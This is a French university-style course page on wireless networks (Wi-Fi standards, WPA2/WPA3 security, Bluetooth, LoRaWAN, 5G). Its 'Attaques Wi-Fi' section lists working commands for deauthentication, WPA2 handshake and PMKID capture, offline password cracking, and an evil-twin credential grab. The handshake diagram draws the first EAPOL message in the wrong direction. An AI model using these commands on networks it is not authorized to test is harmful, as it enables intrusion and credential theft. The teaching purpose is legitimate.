---
layout: course
title: "Réseaux sans fil"
semestre: "S7"
type_cours: "réseaux"
tags: ["Wi-Fi", "802.11", "WPA3", "Bluetooth", "LoRa", "5G", "MIMO", "sécurité Wi-Fi"]
---

## Introduction

Les réseaux sans fil couvrent un spectre large de technologies, des PAN Bluetooth aux réseaux cellulaires 5G, en passant par les WLAN 802.11 et les LPWAN LoRa. Ce cours détaille les architectures, les mécanismes de sécurité et les vecteurs d'attaque.

---

## Wi-Fi — Standards 802.11

### Évolution des standards

| Standard | Bande | Débit max théorique | Modulation | Caractéristiques |
|---------|-------|---------------------|-----------|-----------------|
| 802.11b | 2.4 GHz | 11 Mbit/s | DSSS | 1999, obsolète |
| 802.11g | 2.4 GHz | 54 Mbit/s | OFDM | 2003 |
| 802.11n (Wi-Fi 4) | 2.4 + 5 GHz | 600 Mbit/s | OFDM + MIMO | 2009 |
| 802.11ac (Wi-Fi 5) | 5 GHz | 6.9 Gbit/s | OFDM + MU-MIMO | 2013 |
| 802.11ax (Wi-Fi 6) | 2.4 + 5 + 6 GHz | 9.6 Gbit/s | OFDMA + MU-MIMO | 2019 |
| 802.11be (Wi-Fi 7) | 2.4 + 5 + 6 GHz | 46 Gbit/s | 4096-QAM + MLO | 2024 |

### Architecture Wi-Fi

```
Infrastructure mode :
  Stations ──► Access Point (AP) ──► Distribution System (DS) ──► Internet

Ad-hoc (IBSS) :
  Station ◄──► Station (sans AP)

ESS (Extended Service Set) :
  AP1 ───┐
  AP2 ───┼──► DS (même SSID) ──► Internet   (roaming transparent)
  AP3 ───┘
```

**Terminologie :**
- **SSID** : nom du réseau
- **BSSID** : adresse MAC de l'AP
- **BSS** : AP + ses stations
- **ESS** : plusieurs BSS avec le même SSID
- **Beacon** : trame broadcast envoyée par l'AP (~10/s) annonçant sa présence

### Canaux et interférences

```
2.4 GHz — 3 canaux non-chevauchants : 1, 6, 11
5 GHz   — jusqu'à 25 canaux non-chevauchants (20 MHz)
6 GHz   — 59 canaux (Wi-Fi 6E)

Diagnostic :
  iwlist wlan0 scan | grep -E "ESSID|Channel|Signal"
  sudo iw dev wlan0 scan | grep -E "SSID|freq|signal"
```

---

## Sécurité Wi-Fi

### Évolution des protocoles

| Protocole | Chiffrement | Problèmes connus |
|-----------|------------|-----------------|
| WEP | RC4 (40/104 bits) | IV 24 bits → crack en minutes |
| WPA | TKIP + RC4 | Michael MIC vulnérable |
| WPA2-Personal | AES-CCMP (128 bits) | Handshake capturable, PMKID attack |
| WPA2-Enterprise | AES-CCMP + 802.1X | Robuste si bien configuré |
| WPA3-Personal | SAE (Dragonfly) | Pas de handshake offline |
| WPA3-Enterprise | AES-256-GCMP + ECDHE | État de l'art |

### WPA2 — Handshake 4-way

```
Station                           AP
    │                              │
    │──── EAPOL Message 1 (ANonce)──►│
    │◄─── EAPOL Message 2 (SNonce) ──│
    │──── EAPOL Message 3 (GTK) ────►│
    │◄─── EAPOL Message 4 (Ack) ─────│
    │                              │
    PTK = PRF(PMK, ANonce, SNonce, MACs)
    PMK = PBKDF2(SSID, password, 4096 iterations, 256 bits)
```

> Capturer le handshake + lancer un attaque dictionnaire/brute-force offline sur le PMK.

### Attaques Wi-Fi

```bash
# Mode moniteur
sudo airmon-ng start wlan0      # → wlan0mon
sudo iw dev wlan0 set type monitor ; ip link set wlan0 up

# Capture du handshake WPA2
airodump-ng wlan0mon                          # Lister les réseaux
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Déauthentification pour forcer le handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack offline (Hashcat)
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
hashcat -m 22000 capture.hc22000 rockyou.txt --rules-file best64.rule

# Attaque PMKID (sans handshake complet)
hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=3
hcxpcapngtool -z hashes.22000 dump.pcapng
hashcat -m 22000 hashes.22000 rockyou.txt

# Evil Twin — AP jumeau
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf  # Capturer credentials WPA2-Enterprise
```

### WPA3 — SAE (Simultaneous Authentication of Equals)

SAE utilise un échange **Dragonfly** (type Diffie-Hellman) qui ne produit pas de handshake capturable et résiste aux attaques offline même si le mot de passe est deviné après coup (**Perfect Forward Secrecy**).

---

## MIMO et beamforming

**MIMO** (Multiple-Input Multiple-Output) : utilisation de plusieurs antennes en émission et réception pour augmenter le débit et la fiabilité.

```
Spatial multiplexing : 4x4 MIMO = 4 flux spatiaux indépendants → débit ×4
Diversity : redondance → meilleure portée
MU-MIMO (Wi-Fi 5/6) : plusieurs clients simultanément

Beamforming : focalisation du signal vers la station
  → gain de 3-6 dB, meilleure portée, moins d'interférences
```

**OFDMA (Wi-Fi 6)** : subdivision du canal en sous-porteuses allouées à différents clients simultanément — idéal pour les environnements denses.

---

## Bluetooth & BLE

| Caractéristique | Bluetooth Classic | BLE (Bluetooth Low Energy) |
|----------------|-------------------|---------------------------|
| Débit | jusqu'à 3 Mbit/s | 1-2 Mbit/s |
| Consommation | Élevée | Très faible |
| Portée | ~10 m | 10-100 m |
| Usages | Audio, transfert | IoT, capteurs, wearables |

```bash
# Scan Bluetooth
hcitool scan        # Bluetooth Classic
hcitool lescan      # BLE

# Analyse BLE
bluetoothctl
  [bluetooth]# scan on
  [bluetooth]# pair AA:BB:CC:DD:EE:FF
  [bluetooth]# connect AA:BB:CC:DD:EE:FF

# Sniffing BLE avec Ubertooth
ubertooth-btle -f -A 37     # Channel advertisement
```

**Attaques Bluetooth :**
- **BlueSnarfing** : accès non autorisé aux données (carnet d'adresses, SMS)
- **BlueBugging** : prise de contrôle du téléphone
- **KNOB** (2019) : réduction forcée de la clé de chiffrement
- **BLURtooth** (2020) : cross-transport key derivation

---

## LoRaWAN — LPWAN

Technologie **Low Power Wide Area Network** pour l'IoT :

```
Nœud (capteur) ──► Passerelle LoRa ──► Network Server ──► Application Server
                    (radio 868 MHz)     (The Things Network)
```

| Paramètre | Valeur |
|-----------|--------|
| Bande de fréquences | 868 MHz (EU) / 915 MHz (US) |
| Portée | 2-15 km (ville) / jusqu'à 50 km (rural) |
| Débit | 0.3 - 50 kbit/s |
| Payload max | 242 octets |
| Consommation | Très faible (années sur batterie) |

**Spreading Factor (SF) :**

| SF | Débit | Portée | Sensibilité |
|----|-------|--------|-------------|
| SF7 | 5.5 kbit/s | Courte | -123 dBm |
| SF12 | 0.3 kbit/s | Longue | -137 dBm |

---

## Architecture 5G

```
UE (téléphone) ──► gNodeB (antenne 5G NR) ──► 5G Core
                                                  │
                                    ┌─────────────┼─────────────┐
                                   AMF            SMF          UPF
                            (Access &       (Session      (User Plane)
                            Mobility Mgmt)  Mgmt)          → Internet
```

| Élément | Rôle |
|---------|------|
| **AMF** | Authentication, registration, mobility |
| **SMF** | Gestion des sessions PDU |
| **UPF** | Forwarding des données utilisateur |
| **PCF** | Politique réseau |
| **AUSF** | Authentification (5G-AKA) |

**Network Slicing :** création de réseaux virtuels distincts sur la même infrastructure physique (eMBB, URLLC, mMTC).

---

## Résumé

| Technologie | Portée | Débit | Usage principal |
|-------------|--------|-------|----------------|
| Wi-Fi 6 | ~50 m | 9.6 Gbit/s | LAN, bureaux |
| BLE | 10-100 m | 2 Mbit/s | IoT, wearables |
| LoRa | 2-50 km | < 50 kbit/s | Capteurs IoT longue portée |
| 5G mmWave | < 500 m | > 10 Gbit/s | Dense urban, industrie |
| 5G sub-6 | 1-10 km | 1-2 Gbit/s | Usage général |

**Sécurité :** toujours WPA3 ou WPA2-Enterprise. Désactiver WPS. Segmenter les réseaux IoT sur VLAN dédié. Auditer régulièrement avec `airodump-ng` ou Kismet.
